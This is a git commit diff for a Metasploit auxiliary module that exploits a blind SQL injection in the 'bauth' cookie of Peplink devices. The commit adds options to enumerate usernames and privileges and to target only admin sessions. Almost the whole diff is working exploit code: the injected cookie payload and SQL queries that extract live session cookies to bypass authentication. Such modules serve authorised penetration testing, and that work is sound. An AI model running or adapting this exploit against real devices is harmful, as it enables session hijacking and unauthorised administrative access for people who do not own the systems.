a681f7ac466a37b264e1d5aef563bdf142c17262
Niboucha Redouane <rniboucha@yahoo.fr>
2020-07-21 17:01:54 +0200

    Add more options to the peplink SQLi module

--- modules/auxiliary/sqli/peplink_bauth_sqli.rb
+++ modules/auxiliary/sqli/peplink_bauth_sqli.rb
@@ -1,4 +1,3 @@
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::SQLi
@@ -12,7 +11,8 @@ class MetasploitModule < Msf::Auxiliary
           SQL injection vulnerability in the bauth cookie, successful exploitation of the vulnerability allows an
           attacker to retrieve the cookies of authenticated users, bypassing the web portal authentication.
 
-          a session expires 4 hours after login
+          By default, a session expires 4 hours after login (the setting can be changed by the admin), for this
+          reason, the module attempts to retrieve the most recently created sessions.
         },
         'Author' =>
           [
@@ -32,8 +32,10 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The target URI', '/']),
-        OptBool.new('EnumUsername', [false, 'Retrieve the username associated with the session', false]),
-        OptInt.new('LimitTries', [false, 'The max number of sessions to try (from most recent), set to avoid checking expired ones needlessly', nil])
+        OptBool.new('EnumUsernames', [true, 'Retrieve the username associated with the session', false]),
+        OptBool.new('EnumPrivs', [true, 'Retrieve the privilege associated with each session', false]),
+        OptInt.new('LimitTries', [false, 'The max number of sessions to try (from most recent), set to avoid checking expired ones needlessly', nil]),
+        OptBool.new('AdminOnly', [true, 'Only attempt to retrieve cookies of privilegied users (admins)', false])
       ]
     )
   end
@@ -41,42 +43,55 @@ class MetasploitModule < Msf::Auxiliary
   def perform_sqli
     # Note: using run_sql because there is a limit on the length of our queries
     # will work only if we remove the casts, NULL value handling etc.
+    digit_range = ('0'..'9')
+    bit_range = ('0'..'1')
+    alphanumeric_range = ('0'..'z')
     session_count = @sqli.run_sql("select count(1) from sessionsvariables where name='expire'").to_i
     print_status "There are #{session_count} (possibly expired) sessions"
 
     # limit the number of session cookies to retrieve if the option is set
     session_count = datastore['LimitTries'] if datastore['LimitTries'] && datastore['LimitTries'] < session_count
 
-    admin_ids = session_count.times.map do |i|
-      @sqli.run_sql('select id from sessionsvariables ' \
-                    "where name='expire' order by cast(value as int) desc limit 1 offset #{i}").to_i
-    end
+    session_ids = session_count.times.map do |i|
+      id = @sqli.run_sql('select id from sessionsvariables ' \
+                    "where name='expire' order by " \
+                    "cast(value as int) desc limit 1 offset #{i}", output_charset: digit_range).to_i
+      # if AdminOnly, check if is an admin
+      if datastore['AdminOnly']
+        is_rwa = @sqli.run_sql("select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'", output_charset: bit_range).to_i
+        is_rwa > 0 ? id : nil
+      else
+        id
+      end
+    end.compact
 
+    print_status("After filtering out non-admin sessions: #{session_ids.count} sessions remain") if datastore['AdminOnly']
     print_status('Trying the ids from the most recent login')
 
-    admin_ids.each_with_index do |id, idx|
-      cookie = @sqli.run_sql("select sessionid from sessions where id=#{id}")
-      if datastore['EnumUsername']
+    session_ids.each_with_index do |id, idx|
+      cookie = @sqli.run_sql("select sessionid from sessions where id=#{id}", output_charset: alphanumeric_range)
+      if datastore['EnumUsernames']
         username = @sqli.run_sql("select value from sessionsvariables where name='username' and id=#{id}")
-        print_good "Found cookie #{cookie} for user: #{username}"
-      else
-        print_good "Found cookie #{cookie}"
       end
+
+      if datastore['EnumPrivs']
+        is_rwa = @sqli.run_sql("select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'", output_charset: bit_range).to_i
+      end
+      username_msg = username ? ", username = #{username}" : ''
+      is_admin_msg = is_rwa ? ", with #{is_rwa > 0 ? 'read/write' : 'read-only'} permissions" : ''
+      print_good "Found cookie #{cookie}#{username_msg}#{is_admin_msg}"
       break if session_count == idx + 1
     end
   end
 
   def run
     @sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|
-      res = nil
-      loop do
-        res = send_request_cgi({
-          'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'admin.cgi'),
-          'method' => 'GET',
-          'cookie' => "bauth=' or #{payload}--"
-        })
-        break if res
-      end
+      res = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'admin.cgi'),
+        'method' => 'GET',
+        'cookie' => "bauth=' or #{payload}--"
+      })
+      fail_with 'Unable to connect to target' unless res
       !res.headers['Set-Cookie'] # no Set-Cookie header means the session cookie is valid
     end
     if @sqli.test_vulnerable
